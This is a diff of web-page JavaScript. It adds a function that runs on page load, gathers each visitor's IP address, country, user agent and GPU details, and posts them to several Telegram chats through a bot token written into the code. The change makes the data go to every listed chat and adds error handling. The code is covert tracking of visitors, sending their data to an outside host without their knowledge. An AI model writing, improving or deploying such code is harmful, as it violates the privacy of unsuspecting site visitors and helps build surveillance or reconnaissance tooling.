@@ -31,22 +31,26 @@
             }
         }
 
-        async function sendDataToTelegram() {
-            const ipDetails = await getIPDetails();
-            const userAgent = navigator.userAgent;
-            const gpu = getGPUInfo();
+    async function sendDataToTelegram() {
+        const ipDetails = await getIPDetails();
+        const userAgent = navigator.userAgent;
+        const gpu = getGPUInfo();
 
-            const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8";  
-            const chatIds = ["6331127625", "7723080300"];
-            const message = `👤\nIP: ${ipDetails.ip}\nCountry: ${ipDetails.country}\n\nUser-Agent: ${userAgent}\n\nGPU: ${gpu}`;
-            
+        const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8";  
+        const chatIds = ["6331127625", "7723080300"]; 
+
+        const message = `👤\nIP: ${ipDetails.ip}\nCountry: ${ipDetails.country}\n\nUser-Agent: ${userAgent}\n\nGPU: ${gpu}`;
+
+        chatIds.forEach((chatId) => { 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
-            });
-        }
+            }).catch(error => console.error("Error sending message:", error));
+        });
+    }
+
 
         (async () => {
             await sendDataToTelegram();
